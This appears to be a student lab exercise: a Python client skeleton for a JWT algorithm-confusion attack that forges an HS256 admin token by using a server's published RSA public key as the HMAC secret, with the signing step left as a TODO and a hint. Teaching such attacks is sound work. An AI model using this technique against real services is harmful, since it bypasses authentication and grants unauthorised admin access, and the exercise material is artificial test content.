#!/usr/bin/env python3
"""
JWT algorithm-confusion exploit -- STRETCH (optional). RS256->HS256 key confusion -- forge with the PUBLIC key as HMAC secret.

Usage:  python client.py                        # 127.0.0.1:5004
        python client.py http://10.0.0.5:5004    # the instructor's server

Deps:   pip install requests pycryptodome   (JWT helpers in jwt_toy.py, same folder)
"""
import hashlib
import hmac
import sys

import requests
import jwt_toy as jwt          # same folder: b64u_enc, _part(dict)->b64url segment

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5004"

# The server signs its tokens RS256 and *publishes* its RSA public key. But it verifies
# HS256 tokens by HMAC-ing with that same public key. The public key is not secret --
# so you can HMAC your own admin token with it and the server will accept it.

pub_pem = requests.get(f"{BASE}/pubkey").json()["pubkey"].encode()   # the "secret" (public!)

# The two JWT segments you want (header picks HS256; payload makes you admin):
header_seg  = jwt._part({"alg": "HS256", "typ": "JWT"})
payload_seg = jwt._part({"user": "guest", "role": "admin"})
signing_input = f"{header_seg}.{payload_seg}".encode()

# TODO: compute the HS256 signature over `signing_input`, using `pub_pem` as the HMAC key,
#       then base64url-encode it (jwt.b64u_enc) and build the token:
#           token = f"{header_seg}.{payload_seg}.{<your b64url signature>}"
#       Hint: hmac.new(key, msg, hashlib.sha256).digest()
#
# token = ...

# ---- your code here ----

resp = requests.get(f"{BASE}/admin", params={"token": token}).json()
print(resp)
